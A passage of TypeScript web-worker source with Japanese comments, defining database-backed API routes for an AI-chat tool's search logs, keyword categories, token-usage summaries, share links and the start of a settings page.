  ).bind(user.sub, keyword).all<{
    id: string; user_hash: string; question: string; answer: string;
    model: string; created_at: string; access_count: number; question_hash: string | null;
  }>();
  return jsonUtf8({ keyword, results: rows.results ?? [] });
});

app.get('/api/aichat/keywords/monthly', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const month = ((c.req.query('month') ?? '').slice(0, 7)) || new Date().toISOString().slice(0, 7);
  const rows = await c.env.DB.prepare(
    `SELECT keyword, SUM(select_count) AS total_count
     FROM aichat_search_log
     WHERE user_id = ? AND strftime('%Y-%m', last_searched_at) = ?
     GROUP BY keyword
     ORDER BY total_count DESC LIMIT 100`
  ).bind(user.sub, month).all<{ keyword: string; total_count: number }>();
  return jsonUtf8({ month, keywords: rows.results ?? [] });
});

/**
 * AIチャット検索キーワード選択ログ記録 API（認証が必要）
 */
app.get('/api/aichat/search-log', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const rows = await c.env.DB.prepare(
    `SELECT s.keyword, s.share_id, s.first_searched_at, s.last_searched_at, s.select_count,
            c.question
     FROM aichat_search_log s
     LEFT JOIN ai_chat_shares c ON c.id = s.share_id AND c.deleted_at IS NULL
     WHERE s.user_id = ?
     ORDER BY s.last_searched_at DESC
     LIMIT 30`
  ).bind(user.sub).all<{
    keyword: string; share_id: string;
    first_searched_at: string; last_searched_at: string;
    select_count: number; question: string | null;
  }>();
  return jsonUtf8({ rows: rows.results ?? [] });
});

app.get('/api/aichat/search-history', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const rows = await c.env.DB.prepare(
    `SELECT h.id, h.keyword, h.share_id, h.seq_num, h.searched_at, h.deleted_at,
            c.question
     FROM aichat_search_history h
     LEFT JOIN ai_chat_shares c ON c.id = h.share_id AND c.deleted_at IS NULL
     WHERE h.user_id = ?
     ORDER BY h.searched_at DESC
     LIMIT 30`
  ).bind(user.sub).all<{
    id: number; keyword: string; share_id: string;
    seq_num: number; searched_at: string; deleted_at: string | null;
    question: string | null;
  }>();
  return jsonUtf8({ rows: rows.results ?? [] });
});

app.get('/api/aichat/search-keyword-analysis', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const rows = await c.env.DB.prepare(
    `SELECT h.share_id, c.question, h.keyword, MAX(h.seq_num) AS max_seq_num
     FROM aichat_search_history h
     LEFT JOIN ai_chat_shares c ON c.id = h.share_id
     WHERE h.user_id = ? AND h.deleted_at IS NULL
     GROUP BY h.share_id, h.keyword
     ORDER BY h.share_id, max_seq_num DESC`
  ).bind(user.sub).all<{
    share_id: string; question: string | null;
    keyword: string; max_seq_num: number;
  }>();

  const map = new Map<string, { share_id: string; question: string | null; keywords: Array<{ keyword: string; max_seq_num: number }> }>();
  for (const row of (rows.results ?? [])) {
    if (!map.has(row.share_id)) {
      map.set(row.share_id, { share_id: row.share_id, question: row.question, keywords: [] });
    }
    map.get(row.share_id)!.keywords.push({ keyword: row.keyword, max_seq_num: row.max_seq_num });
  }

  return jsonUtf8({ items: Array.from(map.values()) });
});

app.post('/api/aichat/search-log', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const body = await c.req.json<{ keyword?: string; shareId?: string; resultCount?: number }>();
  const keyword = (body.keyword ?? '').trim().slice(0, 200);
  const shareId = (body.shareId ?? '').trim().slice(0, 100);
  if (!keyword || !shareId) return jsonUtf8({ error: 'keyword と shareId は必須です' }, 400);
  const resultCount = typeof body.resultCount === 'number' ? body.resultCount : null;
  const now = new Date().toISOString();
  await c.env.DB.prepare(
    `INSERT INTO aichat_search_log (user_id, keyword, share_id, first_searched_at, last_searched_at, select_count, result_count)
     VALUES (?, ?, ?, ?, ?, 1, ?)
     ON CONFLICT(user_id, keyword, share_id) DO UPDATE SET
       last_searched_at = excluded.last_searched_at,
       select_count = select_count + 1,
       result_count = excluded.result_count`
  ).bind(user.sub, keyword, shareId, now, now, resultCount).run();
  await c.env.DB.prepare(
    `INSERT INTO aichat_search_history (user_id, keyword, share_id, seq_num, searched_at, result_count)
     VALUES (?, ?, ?,
       (SELECT COALESCE(COUNT(*), 0) + 1 FROM aichat_search_history WHERE user_id = ? AND keyword = ? AND share_id = ?),
       ?, ?)`
  ).bind(user.sub, keyword, shareId, user.sub, keyword, shareId, now, resultCount).run();
  return jsonUtf8({ ok: true });
});

app.get('/api/aichat/search-impressions', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const rows = await c.env.DB.prepare(
    `SELECT i.share_id, s.question,
            COUNT(DISTINCT i.id) AS impression_count,
            MAX(i.result_count) AS max_result_count,
            MAX(i.searched_at) AS last_searched_at,
            l.keyword, MAX(l.select_count) AS max_select_count
     FROM aichat_search_impressions i
     LEFT JOIN ai_chat_shares s ON s.id = i.share_id
     LEFT JOIN aichat_search_log l ON l.user_id = i.user_id AND l.share_id = i.share_id AND l.deleted_at IS NULL
     WHERE i.user_id = ? AND i.deleted_at IS NULL
       AND i.share_id IN (
         SELECT share_id FROM aichat_search_impressions
         WHERE user_id = ? AND deleted_at IS NULL
         GROUP BY share_id
         ORDER BY COUNT(*) DESC
         LIMIT 30
       )
     GROUP BY i.share_id, l.keyword
     ORDER BY impression_count DESC, i.share_id, max_select_count DESC`
  ).bind(user.sub, user.sub).all<{
    share_id: string; question: string | null;
    impression_count: number; max_result_count: number | null;
    last_searched_at: string; keyword: string | null; max_select_count: number | null;
  }>();

  const map = new Map<string, { share_id: string; question: string | null; impression_count: number; max_result_count: number | null; last_searched_at: string; keywords: Array<{ keyword: string; max_select_count: number }> }>();
  for (const row of (rows.results ?? [])) {
    if (!map.has(row.share_id)) {
      map.set(row.share_id, { share_id: row.share_id, question: row.question, impression_count: row.impression_count, max_result_count: row.max_result_count, last_searched_at: row.last_searched_at, keywords: [] });
    }
    if (row.keyword) {
      map.get(row.share_id)!.keywords.push({ keyword: row.keyword, max_select_count: row.max_select_count ?? 0 });
    }
  }

  return jsonUtf8({ items: Array.from(map.values()) });
});

app.post('/api/aichat/search-impressions', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const body = await c.req.json<{ shareIds?: string[]; resultCount?: number }>();
  const shareIds = Array.isArray(body.shareIds) ? body.shareIds : [];
  const resultCount = typeof body.resultCount === 'number' ? body.resultCount : null;
  if (shareIds.length === 0) return jsonUtf8({ ok: true, inserted: 0 });
  const now = new Date().toISOString();
  const stmts = shareIds.map((shareId) =>
    c.env.DB.prepare(
      `INSERT INTO aichat_search_impressions (user_id, share_id, result_count, searched_at) VALUES (?, ?, ?, ?)`
    ).bind(user.sub, String(shareId).slice(0, 100), resultCount, now)
  );
  await c.env.DB.batch(stmts);
  return jsonUtf8({ ok: true, inserted: shareIds.length });
});

/**
 * サブクエリマスタ一覧取得 API
 */
app.get('/api/aichat/subqueries', authMiddleware, async (c) => {
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const [rows, kwRows] = await Promise.all([
    c.env.DB.prepare(
      `SELECT s.id, s.query, COUNT(l.id) AS link_count
       FROM aichat_subqueries s
       LEFT JOIN aichat_share_subquery_links l ON l.subquery_id = s.id
       GROUP BY s.id, s.query
       ORDER BY link_count DESC, s.id DESC
       LIMIT 100`
    ).all<{ id: number; query: string; link_count: number }>(),
    c.env.DB.prepare(
      `SELECT l.subquery_id, h.keyword, COUNT(*) AS cnt
       FROM aichat_share_subquery_links l
       JOIN ai_chat_shares cs ON cs.question = l.question
       JOIN aichat_search_history h ON h.share_id = cs.id
       WHERE h.deleted_at IS NULL
       GROUP BY l.subquery_id, h.keyword
       ORDER BY l.subquery_id, cnt DESC`
    ).all<{ subquery_id: number; keyword: string; cnt: number }>(),
  ]);
  const kwMap = new Map<number, Array<{ keyword: string; cnt: number }>>();
  for (const kw of kwRows.results ?? []) {
    if (!kwMap.has(kw.subquery_id)) kwMap.set(kw.subquery_id, []);
    kwMap.get(kw.subquery_id)!.push({ keyword: kw.keyword, cnt: kw.cnt });
  }
  const items = (rows.results ?? []).map(r => ({
    ...r,
    keywords: kwMap.get(r.id) ?? [],
  }));
  return jsonUtf8({ items });
});

/**
 * サブクエリマスタ登録 API（重複時は無視）
 */
app.post('/api/aichat/subqueries', authMiddleware, async (c) => {
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const body = await c.req.json<{ query?: string }>();
  const query = typeof body.query === 'string' ? body.query.trim() : '';
  if (!query) return jsonUtf8({ error: 'query は必須です' }, 400);
  const result = await c.env.DB.prepare(
    `INSERT OR IGNORE INTO aichat_subqueries (query) VALUES (?)`
  ).bind(query.slice(0, 500)).run();
  const row = await c.env.DB.prepare(
    `SELECT id, query FROM aichat_subqueries WHERE query = ?`
  ).bind(query.slice(0, 500)).first<{ id: number; query: string }>();
  return jsonUtf8({ ok: true, item: row, inserted: (result.meta?.changes ?? 0) > 0 });
});

/**
 * サブクエリ×キーワードで絞り込んだ質問一覧 API（最大25件・各質問のキーワード付き）
 */
app.get('/api/aichat/subquery-keyword-questions', authMiddleware, async (c) => {
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const subqueryId = Number(c.req.query('subquery_id') ?? '');
  const keyword = (c.req.query('keyword') ?? '').trim();
  if (!subqueryId || !keyword) return jsonUtf8({ error: 'subquery_id と keyword は必須です' }, 400);
  const questionsRows = await c.env.DB.prepare(
    `SELECT DISTINCT cs.id AS share_id, cs.question
     FROM aichat_share_subquery_links l
     JOIN ai_chat_shares cs ON cs.question = l.question
     JOIN aichat_search_history h ON h.share_id = cs.id
     WHERE l.subquery_id = ?1
       AND h.keyword = ?2
       AND h.deleted_at IS NULL
     ORDER BY cs.created_at DESC
     LIMIT 25`
  ).bind(subqueryId, keyword).all<{ share_id: string; question: string }>();
  const questions = questionsRows.results ?? [];
  if (questions.length === 0) return jsonUtf8({ items: [] });
  const placeholders = questions.map(() => '?').join(',');
  const shareIds = questions.map(q => q.share_id);
  const kwRows = await c.env.DB.prepare(
    `SELECT h.share_id, h.keyword, COUNT(*) AS cnt
     FROM aichat_search_history h
     WHERE h.share_id IN (${placeholders})
       AND h.deleted_at IS NULL
     GROUP BY h.share_id, h.keyword
     ORDER BY h.share_id, cnt DESC`
  ).bind(...shareIds).all<{ share_id: string; keyword: string; cnt: number }>();
  const kwMap = new Map<string, Array<{ keyword: string; cnt: number }>>();
  for (const kw of kwRows.results ?? []) {
    if (!kwMap.has(kw.share_id)) kwMap.set(kw.share_id, []);
    kwMap.get(kw.share_id)!.push({ keyword: kw.keyword, cnt: kw.cnt });
  }
  const items = questions.map(q => ({
    share_id: q.share_id,
    question: q.question,
    keywords: kwMap.get(q.share_id) ?? [],
  }));
  return jsonUtf8({ items });
});

/**
 * 質問×サブクエリリンク一覧取得 API
 */
app.get('/api/aichat/share-subquery-links', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const question = c.req.query('question') ?? '';
  if (!question) return jsonUtf8({ items: [] });
  const rows = await c.env.DB.prepare(
    `SELECT l.id, l.question, l.subquery_id, l.url, q.query,
            s.model
     FROM aichat_share_subquery_links l
     JOIN aichat_subqueries q ON q.id = l.subquery_id
     LEFT JOIN ai_chat_shares s ON s.id = CAST(SUBSTR(l.url, INSTR(l.url, '/s/') + 3 + INSTR(SUBSTR(l.url, INSTR(l.url, '/s/') + 3), '/')) AS INTEGER)
       AND s.user_id = l.user_id AND s.deleted_at IS NULL
     WHERE l.user_id = ? AND l.question = ?
     ORDER BY l.id ASC`
  ).bind(user.sub, question).all<{
    id: number; question: string; subquery_id: number; url: string; query: string; model: string | null;
  }>();
  return jsonUtf8({ items: rows.results ?? [] });
});

/**
 * サブクエリを持つ全質問一覧 API（question 単位でグループ集計）
 */
app.get('/api/aichat/share-subquery-links/all', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const rows = await c.env.DB.prepare(
    `SELECT l.id, l.question, l.subquery_id, l.url, q.query, l.question_hash,
            GROUP_CONCAT(DISTINCT s.model) AS models_csv,
            MIN(s.id) AS share_id
     FROM aichat_share_subquery_links l
     JOIN aichat_subqueries q ON q.id = l.subquery_id
     LEFT JOIN ai_chat_shares s ON s.user_id = l.user_id
       AND s.deleted_at IS NULL
       AND (
         CASE WHEN l.question_hash IS NOT NULL
           THEN s.question_hash = l.question_hash
           ELSE s.question = l.question
         END
       )
     WHERE l.user_id = ?
     GROUP BY l.id
     ORDER BY l.question, l.id ASC`
  ).bind(user.sub).all<{
    id: number; question: string; subquery_id: number; url: string; query: string;
    question_hash: string | null; models_csv: string | null; share_id: string | null;
  }>();
  const map = new Map<string, { question: string; share_id: string | null; links: { subquery_id: number; query: string; url: string; question_hash: string | null; models: string[] }[] }>();
  for (const r of rows.results ?? []) {
    if (!map.has(r.question)) map.set(r.question, { question: r.question, share_id: r.share_id ?? null, links: [] });
    map.get(r.question)!.links.push({
      subquery_id: r.subquery_id,
      query: r.query,
      url: r.url,
      question_hash: r.question_hash ?? null,
      models: (r.models_csv || '').split(',').filter(Boolean),
    });
  }
  return jsonUtf8({ items: Array.from(map.values()) });
});

/**
 * share_id に紐づくキーワード一覧（aichat_search_log から取得）
 */
app.get('/api/aichat/share-keywords', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const shareId = (c.req.query('shareId') ?? '').trim();
  if (!shareId) return jsonUtf8({ error: 'shareId は必須です' }, 400);
  const rows = await c.env.DB.prepare(
    `SELECT DISTINCT keyword
     FROM aichat_search_log
     WHERE share_id = ? AND user_id = ?
     ORDER BY select_count DESC
     LIMIT 10`
  ).bind(shareId, user.sub).all<{ keyword: string }>();
  return jsonUtf8({ keywords: (rows.results ?? []).map((r) => r.keyword) });
});

/**
 * 質問テキストで紐づく ai_chat_shares の一覧（question_hash が未設定の旧レコード向けフォールバック）
 */
app.get('/api/aichat/shares-by-question', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const question = (c.req.query('question') ?? '').trim();
  if (!question) return jsonUtf8({ error: 'question は必須です' }, 400);
  const rows = await c.env.DB.prepare(
    `SELECT id, model, question, created_at, access_count, user_hash
     FROM ai_chat_shares
     WHERE question = ? AND user_id = ? AND deleted_at IS NULL
     ORDER BY created_at DESC`
  ).bind(question, user.sub).all<{ id: string; model: string; question: string; created_at: string; access_count: number; user_hash: string }>();
  return jsonUtf8({ items: rows.results ?? [] });
});

/**
 * question_hash で紐づく ai_chat_shares の一覧（異モデル比較用）
 */
app.get('/api/aichat/shares-by-question-hash', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const hash = (c.req.query('hash') ?? '').trim();
  if (!hash) return jsonUtf8({ error: 'hash は必須です' }, 400);
  const rows = await c.env.DB.prepare(
    `SELECT id, model, question, created_at, access_count, user_hash
     FROM ai_chat_shares
     WHERE question_hash = ? AND user_id = ? AND deleted_at IS NULL
     ORDER BY created_at DESC`
  ).bind(hash, user.sub).all<{ id: string; model: string; question: string; created_at: string; access_count: number; user_hash: string }>();
  return jsonUtf8({ items: rows.results ?? [] });
});

/**
 * キーワード分類: 全キーワード一覧（出現回数・分類済みフラグ付き）
 * aichat_keyword_category_map が未作成の場合は is_classified=0 でフォールバック
 */
app.get('/api/aichat/all-keywords', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  try {
    const rows = await c.env.DB.prepare(
      `SELECT s.keyword, SUM(s.select_count) AS cnt,
         CASE WHEN m.category_id IS NOT NULL THEN 1 ELSE 0 END AS is_classified,
         m.category_id,
         COALESCE(c.color, '#6366f1') AS category_color
       FROM aichat_search_log s
       LEFT JOIN aichat_keyword_category_map m ON m.keyword = s.keyword AND m.user_id = s.user_id
       LEFT JOIN aichat_keyword_categories c ON c.id = m.category_id AND c.user_id = s.user_id
       WHERE s.user_id = ?
       GROUP BY s.keyword
       ORDER BY SUM(s.select_count) DESC`
    ).bind(user.sub).all<{ keyword: string; cnt: number; is_classified: number; category_id: number | null; category_color: string | null }>();
    return jsonUtf8({ keywords: rows.results ?? [] });
  } catch {
    const rows = await c.env.DB.prepare(
      `SELECT keyword, SUM(select_count) AS cnt
       FROM aichat_search_log
       WHERE user_id = ?
       GROUP BY keyword
       ORDER BY cnt DESC`
    ).bind(user.sub).all<{ keyword: string; cnt: number }>();
    return jsonUtf8({ keywords: (rows.results ?? []).map((r) => ({ ...r, is_classified: 0, category_id: null, category_color: null })) });
  }
});

/**
 * キーワード分類: カテゴリ一覧（keyword 指定時は is_mapped フラグ付き、color 付き）
 */
app.get('/api/aichat/keyword-categories', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const keyword = (c.req.query('keyword') ?? '').trim();
  const rows = await c.env.DB.prepare(
    `SELECT c.id, c.name, c.color,
       (SELECT COUNT(*) FROM aichat_keyword_category_map m
        WHERE m.category_id = c.id AND m.keyword = ? AND m.user_id = ?) AS is_mapped
     FROM aichat_keyword_categories c
     WHERE c.user_id = ?
     ORDER BY c.name`
  ).bind(keyword, user.sub, user.sub).all<{ id: number; name: string; color: string; is_mapped: number }>();
  return jsonUtf8({ categories: rows.results ?? [] });
});

/**
 * トークン使用量: 月別・モデル別集計
 * ai_chat_shares の input_tokens / output_tokens / total_tokens を月・モデルでグループ集計
 * columns 未追加の場合は空配列でフォールバック
 */
app.get('/api/aichat/token-usage', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const months = Math.min(Math.max(parseInt(c.req.query('months') ?? '6', 10), 1), 24);
  const since = new Date(Date.now() - months * 31 * 24 * 60 * 60 * 1000).toISOString().slice(0, 7) + '-01';
  try {
    const rows = await c.env.DB.prepare(
      `SELECT
         strftime('%Y-%m', created_at) AS month,
         model,
         SUM(COALESCE(input_tokens, 0)) AS input_tokens,
         SUM(COALESCE(output_tokens, 0)) AS output_tokens,
         SUM(COALESCE(total_tokens, 0)) AS total_tokens,
         COUNT(*) AS request_count
       FROM ai_chat_shares
       WHERE user_id = ? AND created_at >= ?
         AND (input_tokens IS NOT NULL OR output_tokens IS NOT NULL)
       GROUP BY month, model
       ORDER BY month ASC, model ASC`
    ).bind(user.sub, since).all<{
      month: string; model: string;
      input_tokens: number; output_tokens: number; total_tokens: number; request_count: number;
    }>();
    return jsonUtf8({ rows: rows.results ?? [] });
  } catch {
    return jsonUtf8({ rows: [], _warning: 'schema not ready' });
  }
});

/**
 * キーワード分類: カテゴリ別キーワード件数サマリー（件数多い順）
 * color カラム未追加・map テーブル未作成の場合は空配列で応答
 */
app.get('/api/aichat/keyword-categories-summary', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  try {
    const rows = await c.env.DB.prepare(
      `SELECT c.id, c.name, COALESCE(c.color, '#6366f1') AS color,
         COUNT(DISTINCT m.keyword) AS kw_count
       FROM aichat_keyword_categories c
       LEFT JOIN aichat_keyword_category_map m ON m.category_id = c.id AND m.user_id = c.user_id
       WHERE c.user_id = ?
       GROUP BY c.id
       ORDER BY kw_count DESC, c.name`
    ).bind(user.sub).all<{ id: number; name: string; color: string; kw_count: number }>();
    return jsonUtf8({ categories: rows.results ?? [] });
  } catch {
    return jsonUtf8({ categories: [], _warning: 'schema not ready' });
  }
});

/**
 * キーワード分類: カテゴリ新規作成（color 付き）
 */
app.post('/api/aichat/keyword-categories', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const body = await c.req.json<{ name?: string; color?: string }>();
  const name = typeof body.name === 'string' ? body.name.trim() : '';
  if (!name) return jsonUtf8({ error: 'name は必須です' }, 400);
  const color = typeof body.color === 'string' && /^#[0-9a-fA-F]{6}$/.test(body.color.trim())
    ? body.color.trim() : '#6366f1';
  const now = new Date().toISOString();
  const result = await c.env.DB.prepare(
    `INSERT OR IGNORE INTO aichat_keyword_categories (user_id, name, color, created_at) VALUES (?, ?, ?, ?)`
  ).bind(user.sub, name.slice(0, 100), color, now).run();
  const row = await c.env.DB.prepare(
    `SELECT id, name, color FROM aichat_keyword_categories WHERE user_id = ? AND name = ?`
  ).bind(user.sub, name.slice(0, 100)).first<{ id: number; name: string; color: string }>();
  return jsonUtf8({ ok: true, inserted: (result.meta?.changes ?? 0) > 0, category: row });
});

/**
 * キーワード分類: キーワード↔カテゴリ紐付け保存
 */
app.post('/api/aichat/keyword-category-map', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const body = await c.req.json<{ keyword?: string; category_ids?: number[] }>();
  const keyword = typeof body.keyword === 'string' ? body.keyword.trim() : '';
  const categoryIds = Array.isArray(body.category_ids) ? body.category_ids.filter((id) => typeof id === 'number') : [];
  if (!keyword || categoryIds.length === 0) return jsonUtf8({ error: 'keyword と category_ids は必須です' }, 400);
  const now = new Date().toISOString();
  let inserted = 0;
  for (const catId of categoryIds) {
    const result = await c.env.DB.prepare(
      `INSERT OR IGNORE INTO aichat_keyword_category_map (user_id, keyword, category_id, created_at) VALUES (?, ?, ?, ?)`
    ).bind(user.sub, keyword.slice(0, 200), catId, now).run();
    inserted += result.meta?.changes ?? 0;
  }
  return jsonUtf8({ ok: true, inserted });
});

/**
 * 質問×サブクエリリンク登録 API（同一質問×サブクエリは重複無視）
 */
app.post('/api/aichat/share-subquery-links', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const body = await c.req.json<{ question?: string; subquery_id?: number; url?: string }>();
  const question = typeof body.question === 'string' ? body.question.trim() : '';
  const subqueryId = typeof body.subquery_id === 'number' ? body.subquery_id : 0;
  const url = typeof body.url === 'string' ? body.url.trim() : '';
  if (!question || !subqueryId || !url) return jsonUtf8({ error: 'question, subquery_id, url は必須です' }, 400);
  const now = new Date().toISOString();
  const questionHash = await computeQuestionHash(user.sub, question);
  const result = await c.env.DB.prepare(
    `INSERT OR IGNORE INTO aichat_share_subquery_links (user_id, question, subquery_id, url, created_at, question_hash) VALUES (?, ?, ?, ?, ?, ?)`
  ).bind(user.sub, question.slice(0, 500), subqueryId, url.slice(0, 1000), now, questionHash).run();
  return jsonUtf8({ ok: true, inserted: (result.meta?.changes ?? 0) > 0, questionHash });
});

/**
 * AIチャット過去ログ論理削除 API（認証が必要）
 */
app.get('/api/aichat/shares/:id', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const id = c.req.param('id');
  const row = await c.env.DB.prepare(
    `SELECT id, user_hash, question, answer, model, created_at, access_count, question_hash,
            input_tokens, output_tokens, total_tokens
     FROM ai_chat_shares WHERE id = ? AND user_id = ? AND deleted_at IS NULL`
  ).bind(id, user.sub).first<{
    id: string; user_hash: string; question: string; answer: string;
    model: string; created_at: string; access_count: number; question_hash: string | null;
    input_tokens: number | null; output_tokens: number | null; total_tokens: number | null;
  }>();
  if (!row) return jsonUtf8({ error: 'Not found' }, 404);
  return jsonUtf8(row);
});

app.delete('/api/aichat/shares/:id', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);

  const id = c.req.param('id');
  const row = await c.env.DB.prepare(
    'SELECT id FROM ai_chat_shares WHERE id = ? AND user_id = ? AND deleted_at IS NULL'
  ).bind(id, user.sub).first<{ id: string }>();

  if (!row) return jsonUtf8({ error: '見つかりません' }, 404);

  await c.env.DB.prepare(
    'UPDATE ai_chat_shares SET deleted_at = ? WHERE id = ?'
  ).bind(new Date().toISOString(), id).run();

  return jsonUtf8({ ok: true });
});

/**
 * AIチャット共有リンク作成 API（認証が必要）
 */
app.post('/api/aichat/share', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);

  let body: { question?: string; answer?: string; model?: string };
  try {
    body = await c.req.json();
  } catch {
    return jsonUtf8({ error: 'リクエスト形式が不正です' }, 400);
  }

  const question = (body.question ?? '').trim();
  const answer = (body.answer ?? '').trim();
  const model = (body.model ?? '').trim();
  if (!question || !answer) return jsonUtf8({ error: '質問または回答が空です' }, 400);

  const usernameBytes = new TextEncoder().encode(user.sub);
  const hashBuf = await crypto.subtle.digest('SHA-256', usernameBytes);
  const userHash = Array.from(new Uint8Array(hashBuf).slice(0, 4))
    .map((b) => b.toString(16).padStart(2, '0')).join('');

  const tokenBytes = new Uint8Array(8);
  crypto.getRandomValues(tokenBytes);
  const shareToken = Array.from(tokenBytes).map((b) => b.toString(16).padStart(2, '0')).join('');

  const now = new Date().toISOString();
  const conversationHash = await computeConversationHash(user.sub, question, answer, model, now);
  const questionHash = await computeQuestionHash(user.sub, question);
  await c.env.DB.prepare(
    'INSERT INTO ai_chat_shares (id, user_id, user_hash, question, answer, model, created_at, conversation_hash, question_hash) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)'
  ).bind(shareToken, user.sub, userHash, question, answer, model, now, conversationHash, questionHash).run();

  const origin = new URL(c.req.url).origin;
  const shareUrl = `${origin}/s/${userHash}/${shareToken}`;
  return jsonUtf8({ shareUrl });
});

/**
 * AIチャット共有ページ（認証不要）
 */
app.get('/s/:userHash/:shareToken', async (c) => {
  if (!c.env.DB) return c.html(getAiChatShareNotFoundPage(), 503);

  const userHash = c.req.param('userHash');
  const shareToken = c.req.param('shareToken');

  const row = await c.env.DB.prepare(
    'SELECT id, user_id, question, answer, model, created_at, access_count FROM ai_chat_shares WHERE id = ? AND user_hash = ? AND deleted_at IS NULL'
  ).bind(shareToken, userHash).first<{
    id: string; user_id: string; question: string; answer: string;
    model: string; created_at: string; access_count: number;
  }>();

  if (!row) return c.html(getAiChatShareNotFoundPage(), 404);

  await c.env.DB.prepare(
    'UPDATE ai_chat_shares SET access_count = access_count + 1, accessed_at = ? WHERE id = ?'
  ).bind(new Date().toISOString(), shareToken).run();

  return c.html(getAiChatSharePage({ ...row, access_count: row.access_count + 1 }));
});

/**
 * 設定ページ（認証が必要）
 */
app.get('/settings', authMiddleware, async (c) => {
  const user = c.get('user');

  const cookieHeader = c.req.header('Cookie');
  const cookieVals = getCookieValues(cookieHeader, [
    'user_timezone',
    'user_session_duration',
    'user_recent_commits_count',
    'user_toast_duration',
    'user_status_commit_cache_sort_mode',
    'user_status_chart_mode',
    'user_status_chart_sort_order',
    'user_status_table_autodetect',
    'user_status_show_autodetected_tables',
    'user_status_ignore_unknown_unclassified_warning',
    'user_search_label_mode',
  ]);
  const timezone = cookieVals['user_timezone'] || DEFAULT_TIMEZONE;
  const sessionDuration = cookieVals['user_session_duration'] || '1h';
  const recentCommitsCount = parseInt(cookieVals['user_recent_commits_count'] || '20', 10) || 20;
  const toastDuration = parseInt(cookieVals['user_toast_duration'] || '10', 10) || 10;
  const statusCommitCacheSortMode = cookieVals['user_status_commit_cache_sort_mode'] === 'toggle' ? 'toggle' : 'off';
  const statusChartMode = cookieVals['user_status_chart_mode'] === 'repo' ? 'repo' : 'gradient';
  const statusChartSortOrder = cookieVals['user_status_chart_sort_order'] === 'date' ? 'date' : 'count';
  const statusTableAutoDetect = cookieVals['user_status_table_autodetect'] === 'off' ? 'off' : 'on';
  const statusShowAutoDetectedTables = cookieVals['user_status_show_autodetected_tables'] === 'on' ? 'on' : 'off';
  const statusIgnoreUnknownUnclassifiedWarning = cookieVals['user_status_ignore_unknown_unclassified_warning'] === 'off' ? 'off' : 'on';
  const searchLabelMode = ['manual-modal', 'auto-classify'].includes(cookieVals['user_search_label_mode'] ?? '') ? cookieVals['user_search_label_mode'] : 'uncategorized';

  let issuedAt: string;
  let expiresAt: string;

  const issuedDate = new Date(user.iat * 1000);
  const expiresDate = new Date(user.exp * 1000);
  issuedAt = formatTimestampWithTimezone(issuedDate, timezone);
  expiresAt = formatTimestampWithTimezone(expiresDate, timezone);

  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;
  const resolvedTimezone = userSession?.timezone || getCookieValues(cookieHeader, ['user_timezone'])['user_timezone'] || DEFAULT_TIMEZONE;

  let grantedScopes: string[] | null = null;
  let scopesError: string | null = null;
  const clientId = c.env.GITHUB_CLIENT_ID;
  const clientSecret = c.env.GITHUB_CLIENT_SECRET;

  if (accessToken && clientId && clientSecret) {
    try {
      grantedScopes = await getGitHubTokenScopes({ accessToken, clientId, clientSecret });
    } catch (error) {
      logger.warn('Failed to fetch GitHub token scopes', {
        userId: user.sub,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
      if (error instanceof GitHubTokenScopesError) {
        const suffix = error.apiMessage ? `: ${normalizeGitHubApiMessage(error.apiMessage)}` : '';
        scopesError = `付与スコープを取得できませんでした (HTTP ${error.status})${suffix}`;
      } else {
        scopesError = '付与スコープを取得できませんでした';
      }
    }
  } else if (!accessToken) {
    scopesError = 'アクセストークンが保存されていません';
  } else {
